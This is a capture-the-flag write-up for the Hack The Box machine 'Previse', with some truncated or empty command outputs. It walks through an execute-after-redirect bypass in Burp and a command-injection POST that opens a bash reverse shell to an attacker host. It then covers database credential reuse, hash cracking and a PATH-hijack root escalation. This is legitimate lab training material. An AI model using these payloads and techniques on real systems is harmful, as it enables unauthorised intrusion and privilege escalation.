## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```bash
Nmap scan report for 10.10.11.104
Host is up (0.13s latency).

```
As we can see we have only two ports open: 22 and 80, so withouth further doing let's start enumerate port 80.  
As we open the web page, we can notice an authentication prompt, if we try common default credentials we have no luck.  
If we use `gobuster` and start directory enumeration, we can notice that the sizes of 302 resposes are a bit strange:

```
if we take one of this resquests and send it to burp, we can see that in the 302 response body the site is discoling the code page before redirecting us.  
This type of vulnerability is called Execute After Read (EAR), the same has been discovered in a previous assessment in [Bank](Bank.md).  
Now we can set up a 'Match and Replace' rule in burpsuite to match `302 Found` and replace it with `200 Ok`  in the response header. 
Once we setup this rule we will be able to open restricted pages and create an administrator account that we can use to access the platform as a regular user.
Once we are logged in we can notice a 'download siteBackup' button.  
If we click on this button, we will be able to download the site code and see the following in `logs.php`
```php
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;
```
Now we can try to exploit this part of code and get a reverse shell.

## Foothold
We can try to obtain a blind command ececution by adding a `; sleep 2` before the delim parameter and exploit the code snippet above.  
As we can observe we will see the response time increase after we add a sleep command:  
![](AttachmentS/Pasted%20image%2020220708160454.png)
Once we can see that we can inject code, we can add our reverse bash payload to gain a shell on this box:  
```
POST /logs.php HTTP/1.1

delim=comma%3b+bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.9/9001+0>%261'
```
as we execute this request we get a shell as `www-data`:
```bash
root@kali:~/Documents/HTB/Boxes/Previse/site# nc -lvnp 9001
listening on [any] 9001 ...
        connect to [10.10.14.9] from (UNKNOWN) [10.10.11.104] 39672
bash: cannot set terminal process group (1298): Inappropriate ioctl for device
bash: no job control in this shell
www-data@previse:/var/www/html$ 
```

## User
Coming back to the code, we can see that MySQL credentials are disclosed within the code.  
```php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```
Once we have shell access to this box, we can try to login to mysql using the above credentials.  
```shell
www-data@previse:/var/www/html$ mysql -u root -p
Enter password:

Once we are logged into the database we can poke around for hashes:  
```shell
mysql> show databases;

we know the password for our account, let's try now to crack the `m55crypt` hash for the user `m4lwhere`.  
```shell
[root@kali Previse ]$ hashcat hash.txt --wordlist /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.5) starting in autodetect mode

As we can see we cracked the hash and obtained a password.  
Once we have the password we can try to login via ssh:  
```shell
[root@kali Previse ]$ ssh -l m4lwhere $TARGET 
m4lwhere@10.10.11.104's password:

```
## Root
Once we log in, we can check sudo capabilities for user `m4lwhere`, when sudo prompts the password we are able to provide a valid passphrase since we have the user's password.  
```bash
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```
If we inspect the script, we can notice that the script is using relative paths and that sudo is noth defining any secure_path directive:  
```bash
m4lwhere@previse:/opt/scripts$ cat access_backup.sh 
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```
Now we can create a `gzip` file containing `chmod 4755 /bin/bash` and export `$PATH` with this new value:  
```bash
m4lwhere@previse:~$ vi gzip
m4lwhere@previse:~$ chmod +x gzip 
m4lwhere@previse:~$ ls
gzip  user.txt
m4lwhere@previse:~$ export PATH=$(pwd):$PATH
m4lwhere@previse:~$ echo $PATH
/home/m4lwhere:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh                                                                                                                                                                                     
m4lwhere@previse:~$ ls -l /bin/bash 
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
m4lwhere@previse:~$ bash -p
bash-4.4# id
uid=1000(m4lwhere) gid=1000(m4lwhere) euid=0(root) groups=1000(m4lwhere)
```
and we have a root shell
